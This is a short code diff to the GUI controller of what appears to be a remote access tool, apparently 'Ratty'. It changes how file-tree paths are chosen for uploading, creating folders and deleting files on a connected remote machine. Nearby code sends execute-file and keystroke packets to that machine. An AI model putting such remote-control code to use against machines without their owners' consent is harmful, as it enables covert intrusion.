@@ -104,7 +104,7 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 			if (file != null) {
 				final String localPath = file.getAbsolutePath();
 				final FileTreePanel treePanel = serverClient.getTreePanel();
-				final String path = treePanel.getLastNodePathFolder();
+				final String path = treePanel.getLastPathClicked();
 				
 				packet = new UploadFilePacket(localPath, path);
 			}
@@ -115,7 +115,7 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 			packet = new ExecuteFilePacket(path);
 		} else if (command == FileTreePanel.NEW_FOLDER) {
 			final FileTreePanel treePanel = serverClient.getTreePanel();
-			final String path = treePanel.getLastNodePathFolder();
+			final String path = treePanel.getLastPathClicked();
 			final String name = JOptionPane.showInputDialog(null);
 			
 			if (name != null && !name.isEmpty()) {
@@ -126,8 +126,6 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 			final String path = treePanel.getLastPathClicked();
 			
 			packet = new DeleteFilePacket(path);
-			
-			treePanel.removeFile(path);
 		} else if (command == DisplayPanel.KEY_PRESSED && serverClient.isStreamingDesktop()) {
 			final DisplayPanel displayPanel = serverClient.getDisplayPanel();
 			final int key = displayPanel.getLastKeyHit();
